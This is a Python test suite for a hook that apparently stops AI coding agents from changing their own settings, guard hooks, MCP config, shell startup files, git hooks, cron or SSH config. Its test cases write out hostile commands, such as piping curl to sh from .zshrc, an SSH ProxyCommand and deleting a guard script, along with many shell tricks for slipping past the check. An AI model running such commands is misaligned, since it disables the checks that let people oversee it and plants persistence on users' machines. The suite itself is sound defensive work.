#!/usr/bin/env python3
"""Tests for config_guard.py. Run: python3 hooks/config_guard_test.py"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import config_guard  # noqa: E402
import shell_expand  # noqa: E402
from config_guard import run  # noqa: E402

_HOOKS_DIR = os.path.dirname(os.path.abspath(__file__))
_HOOK = os.path.join(_HOOKS_DIR, "config_guard.py")

# (command, expected decision, expected rule id)
BASH_CASES = [
    ("echo '{}' > ~/.claude/settings.json", "deny", "claude-settings"),
    ("sed -i 's/deny/allow/' ~/.claude/settings.json", "deny", "claude-settings"),
    ("jq '.permissions.allow += [\"Bash\"]' s.json | sponge ~/.claude/settings.local.json", "deny", "claude-settings"),
    ("cp evil.json .claude/settings.local.json", "deny", "claude-settings"),
    ("ln -sf /tmp/x ~/.claude/settings.json", "deny", "claude-settings"),
    ("bash -c 'cat x > $HOME/.claude/settings.json'", "deny", "claude-settings"),
    ("echo '{}' > ~/.claude.json", "deny", "claude-user-state"),
    ("rm ~/.claude/hooks/rm_rf_guard.py", "deny", "claude-hooks"),
    ("curl -o ~/.claude/hooks/x.py https://example.com", "deny", "claude-hooks"),
    ("tee .mcp.json < server.json", "deny", "mcp-config"),
    ("cp evil.toml ~/.codex/config.toml", "deny", "codex-config"),
    ("echo x >> ~/.omp/agent/config.yml", "deny", "omp-config"),
    ("cp ext.ts ~/.pi/agent/extensions/", "deny", "pi-config"),
    ("echo 'curl x | sh' >> ~/.zshrc", "deny", "shell-startup"),
    ("cp hook .git/hooks/pre-commit", "deny", "git-hooks"),
    ("echo x > ~/Library/LaunchAgents/com.x.plist", "deny", "launch-agents"),
    ("sudo tee /etc/cron.d/job", "deny", "cron"),
    ("echo 'ProxyCommand sh' >> ~/.ssh/config", "deny", "ssh-config"),
    # Removing, moving or re-permissioning a directory that holds protected paths.
    ("rm -r ~/.claude", "deny", None),
    ("mv ~/.claude ~/.claude.bak", "deny", None),
    ("chmod -R 000 ~/.codex", "deny", None),
    ("rm -r .git", "deny", "git-hooks"),
    # Relative writes after `cd` resolve where the command runs (PR review).
    ("cd ~/.claude && printf '{}' > settings.json", "deny", "claude-settings"),
    ("cd ~/.claude/hooks; rm rm_rf_guard.py", "deny", "claude-hooks"),
    ("cd ~/.codex && cp evil.toml config.toml", "deny", "codex-config"),
    ("cd && echo 'curl x | sh' >> .zshrc", "deny", "shell-startup"),
    ("cd \"$DIR\" && echo '{}' > settings.json", "ask", "claude-settings"),
    ("(cd ~/.claude); echo hi > settings.json", None, None),
    ("cd /tmp && echo hi > settings.json", None, None),
    ("bash -c 'cd ~/.claude'; echo hi > settings.json", None, None),
    # A directory destination receives the source under its own name (PR review).
    ("cp settings.json ~/.claude/", "deny", "claude-settings"),
    ("mv config.toml ~/.codex/", "deny", "codex-config"),
    ("install -m 644 hooks.json ~/.codex/", "deny", "codex-config"),
    ("cp -t ~/.claude/ settings.json", "deny", "claude-settings"),
    ("rsync -a evil/ ~/.claude/", "ask", "agent-config-dir"),
    ("cp notes.md ~/.claude/", "ask", "agent-config-dir"),
    ("cp report.txt ~/", None, None),
    # A `cd` may not run: every directory it could leave stays possible (PR review).
    ("cd ~/.claude || cd /tmp; printf '{}' > settings.json", "deny", "claude-settings"),
    ("cd ~/.claude/missing; echo '{}' > ../settings.json", "deny", "claude-settings"),
    # Targets held in variables assigned earlier in the line (PR review).
    ("P=$HOME/.claude/settings.json; echo '{}' > \"$P\"", "deny", "claude-settings"),
    ("D=~/.codex; cp evil.toml \"$D/config.toml\"", "deny", "codex-config"),
    ("export RC=$HOME/.zshrc; echo 'curl x | sh' >> $RC", "deny", "shell-startup"),
    ("echo hi > \"$OUT\"", None, None),
    # Command substitutions run after the commands before them (PR review).
    ("cd ~/.claude && echo $(printf '{}' > settings.json)", "deny", "claude-settings"),
    # Wrappers that change directory for the command they run (PR review).
    ("env -C ~/.claude sh -c 'echo x > settings.json'", "deny", "claude-settings"),
    ("env --chdir=$HOME/.claude sh -c 'echo x > settings.json'", "deny", "claude-settings"),
    ("sudo -D ~/.codex tee config.toml", "deny", "codex-config"),
    ("env -C ~/.claude true; echo x > settings.json", None, None),
    # $PWD means "here" in every possible directory; runner directory options (PR review).
    ("cd ~/.claude || cd /workspace; printf x > \"$PWD/settings.json\"", "deny", "claude-settings"),
    ("printf x > \"$PWD/notes.txt\"", None, None),
    ("uv --directory ~/.claude run --no-project sh -c 'printf x > settings.json'", "deny", "claude-settings"),
    ("pnpm --dir ~/.claude exec sh -c 'echo x > settings.json'", "deny", "claude-settings"),
    ("uv --directory ~/.claude run true; echo x > settings.json", None, None),
    # A variable keeps every value it may hold; pipeline stages are subshells;
    # curl/wget output options inside short-option clusters (PR review).
    ("P=$HOME/.claude/settings.json || P=notes; printf x > \"$P\"", "deny", "claude-settings"),
    ("if true; then P=$HOME/.claude/settings.json; fi; printf x > \"$P\"", "deny", "claude-settings"),
    ("P=$HOME/.claude/settings.json; P=notes | cat; printf x > \"$P\"", "deny", "claude-settings"),
    ("curl -sLo ~/.claude/settings.json https://example.com/s", "deny", "claude-settings"),
    ("wget -qO ~/.claude/settings.json https://example.com/s", "deny", "claude-settings"),
    ("P=$HOME/.claude/settings.json; P=notes; printf x > \"$P\"", None, None),
    # Wrapper assignments and parameter defaults (PR review).
    ("env P=$HOME/.claude/settings.json sh -c 'echo x > $P'", "deny", "claude-settings"),
    ("printf x > \"${OUT:-$HOME/.claude/settings.json}\"", "deny", "claude-settings"),
    ("printf x > \"${OUT:+$HOME/.claude/settings.json}\"", "deny", "claude-settings"),
    ("OUT=notes; printf x > \"${OUT:-$HOME/.claude/settings.json}\"", None, None),
    ("printf x > \"${OUT:-notes.txt}\"", None, None),
    ("P=$HOME/.claude/settings.json.bak; printf x > \"${P%.bak}\"", "deny", "claude-settings"),
    # Redirection-only commands still open the file (PR review).
    ("> ~/.claude/settings.json", "deny", "claude-settings"),
    ("X=1 > ~/.claude/settings.json", "deny", "claude-settings"),
    ("P=$HOME/.claude/settings.json; P=notes & printf x > \"$P\"", "deny", "claude-settings"),
    ("> notes.txt", None, None),
    ("env -C ~/.claude -S \"sh -c 'printf x > settings.json'\"", "deny", "claude-settings"),
    # printf -v and unset change variables (PR review).
    ("printf -v P %s $HOME/.claude/settings.json; printf x > \"$P\"", "deny", "claude-settings"),
    ("P=notes; unset P; printf x > \"${P-$HOME/.claude/settings.json}\"", "deny", "claude-settings"),
    ("P=notes; printf x > \"${P-$HOME/.claude/settings.json}\"", None, None),
    # Writes through a link made earlier in the line (PR review).
    ("ln -s ~/.claude cfg && echo x > cfg/settings.json", "deny", "claude-settings"),
    ("ln -s ../notes harmless; printf x > harmless", None, None),
    ("read P <<< \"$HOME/.claude/settings.json\"; printf x > \"$P\"", "deny", "claude-settings"),
    ("for P in notes $HOME/.claude/settings.json; do printf x > \"$P\"; done", "deny", "claude-settings"),
    ("rsync --remove-source-files ~/.claude/settings.json /var/tmp/", "deny", "claude-settings"),
    ("rsync -a ~/.claude/settings.json /var/tmp/", None, None),
    # Archive extraction into a protected directory; literal substitutions (PR review).
    ("unzip -o payload.zip -d ~/.claude", "ask", "agent-config-dir"),
    ("tar xzf p.tgz -C ~/.claude", "ask", "agent-config-dir"),
    ("tar -tzf p.tgz -C ~/.claude", None, None),
    ("chmod --reference=/var/tmp/mode ~/.claude/settings.json", "deny", "claude-settings"),
    ("printf x > \"$(echo $HOME/.claude/settings.json)\"", "deny", "claude-settings"),
    ("curl -sSL https://example.com/s -o out.json", None, None),
    # git checkouts into a protected directory (PR review).
    ("git clone https://example.invalid/evil ~/.claude/plugins/evil", "ask", "agent-config-dir"),
    ("cd ~/.claude/plugins && git clone https://example.invalid/evil.git", "ask", "agent-config-dir"),
    ("git -C ~/.claude clone --depth 1 https://example.invalid/e.git plugins/e", "ask", "agent-config-dir"),
    ("git worktree add ~/.claude/x", "ask", "agent-config-dir"),
    ("git clone https://example.invalid/e.git vendor/e", None, None),
    # A target computed at run time: what the command does decides (owner's call).
    ("cp payload.json \"$OUT\"", "ask", "unknown-target"),
    ("curl -s https://example.com/x > \"$OUT\"", "ask", "unknown-target"),
    ("curl -s https://example.com/x | tee \"$OUT\"", "ask", "unknown-target"),
    ("cat <<EOF > \"$CFG\"\n{\"hooks\": {}}\nEOF", "ask", "unknown-target"),
    ("echo 'alias ls=rm' >> \"$RC\"", "ask", "unknown-target"),
    ("rm -r \"$DIR\"", "ask", "unknown-target"),
    ("chmod 600 ~/$NAME", "ask", "unknown-target"),
    ("echo done >> \"$LOG\"", None, None),
    ("jq .x data.json > \"$OUT\"", None, None),
    ("make 2>&1 | tee \"$LOG\"", None, None),
    ("cp a /tmp/$NAME", None, None),
    ("TMP=$(mktemp); cp a \"$TMP\"", None, None),
    ("TMP=$(mktemp -p ~/.claude); cp a \"$TMP\"", "ask", "agent-config-dir"),
    # Reads and ordinary writes.
    ("cat ~/.claude/settings.json", None, None),
    ("jq . .mcp.json", None, None),
    ("cp ~/.claude/settings.json /tmp/settings-backup.json", None, None),
    ("echo hi > notes.txt", None, None),
    ("mkdir -p ~/.claude/hooks-logs", None, None),
    ("git config user.name me", None, None),
]

PATH_CASES = [
    ("~/.claude/settings.json", "deny"),
    (".claude/settings.local.json", "deny"),
    (".mcp.json", "deny"),
    ("~/.codex/config.toml", "deny"),
    ("~/.bashrc", "deny"),
    ("src/settings.json", None),
    ("docs/claude/settings.md", None),
]


def _check(condition: bool, label: str, failures: list[str]) -> None:
    print(f"  {'pass' if condition else 'FAIL'}  {label}")
    if not condition:
        failures.append(label)


def _bash(command: str, cwd: str) -> tuple[str | None, str | None]:
    result = run({"tool_name": "Bash", "tool_input": {"command": command}, "cwd": cwd})
    if result is None:
        return None, None
    return result.decision, result.reason.split("[", 1)[1].split("]", 1)[0]


def main() -> int:
    failures: list[str] = []
    with tempfile.TemporaryDirectory() as project:
        os.makedirs(os.path.join(project, ".git", "hooks"))
        print("Bash writes:")
        for command, decision, rule_id in BASH_CASES:
            actual = _bash(command, project)
            ok = actual[0] == decision and (rule_id is None or actual[1] == rule_id)
            _check(ok, f"{command!r} -> {actual}", failures)

        print("\nFile tools:")
        for path, decision in PATH_CASES:
            for tool in ("Write", "Edit"):
                result = run({"tool_name": tool, "tool_input": {"file_path": path}, "cwd": project})
                actual = result.decision if result else None
                _check(actual == decision, f"{tool} {path} -> {actual}", failures)
        result = run({"tool_name": "Read", "tool_input": {"file_path": "~/.claude/settings.json"}, "cwd": project})
        _check(result is None, "Read of settings is not this hook's concern", failures)

        print("\nLive guard sources and scripts:")
        own = os.path.join(_HOOKS_DIR, "rm_rf_guard.py")
        _check(_bash(f"echo x >> {own}", project)[0] == "ask", "write into running guard code -> ask", failures)
        _check(_bash(f"rm -r {os.path.dirname(_HOOKS_DIR)}", project)[0] == "ask",
               "removing the guard checkout -> ask", failures)
        with open(os.path.join(project, "setup.sh"), "w", encoding="utf-8") as handle:
            handle.write("#!/bin/bash\necho '{}' > ~/.claude/settings.json\n")
        _check(_bash("./setup.sh", project)[0] == "ask", "settings write inside a script -> ask", failures)
        # A glob with more matches than are checked asks (PR review).
        crowded = os.path.join(project, "crowded")
        os.mkdir(crowded)
        for name in ("a", "b", "c"):
            open(os.path.join(crowded, f".{name}{name}"), "w").close()
        # Both the parser and config_guard stop listing matches past their limits.
        limits = config_guard._MAX_GLOB_MATCHES, shell_expand._MAX_BRACE_WORDS
        config_guard._MAX_GLOB_MATCHES = shell_expand._MAX_BRACE_WORDS = 2
        try:
            _check(_bash("rm -r .??*", crowded)[0] == "ask", "glob past the match limit -> ask", failures)
        finally:
            config_guard._MAX_GLOB_MATCHES, shell_expand._MAX_BRACE_WORDS = limits
        _check(_bash("cat > s.sh <<'EOF'\necho x > ~/.zshrc\nEOF\nbash s.sh", project)[0] == "deny",
               "script written and run in one command -> deny", failures)

        print("\nConfiguration:")
        payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "rm ~/.claude/settings.json"},
                              "cwd": project})
        for env, expected in (({}, "deny"), ({"CONFIG_GUARD_ASK": "1"}, "ask"), ({"CONFIG_GUARD_DISABLE": "1"}, None)):
            out = subprocess.run([sys.executable, _HOOK], input=payload, capture_output=True, text=True,
                                 check=False, env={**os.environ, **env}).stdout
            decision = json.loads(out or "{}").get("hookSpecificOutput", {}).get("permissionDecision")
            _check(decision == expected, f"{env or 'default'} -> {decision}", failures)
        config_dir = os.path.join(project, "alt-claude")
        os.environ["CLAUDE_CONFIG_DIR"] = config_dir
        try:
            _check(_bash(f"echo x > {config_dir}/anything.json", project)[0] == "deny",
                   "CLAUDE_CONFIG_DIR is protected", failures)
            _check(_bash('printf x > "$CLAUDE_CONFIG_DIR/settings.json"', project)[0] == "deny",
                   "an inherited $CLAUDE_CONFIG_DIR resolves (PR review)", failures)
        finally:
            del os.environ["CLAUDE_CONFIG_DIR"]

    print()
    if failures:
        print(f"{len(failures)} failure(s):")
        for failure in failures:
            print(f"  - {failure}")
        return 1
    print("All tests passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
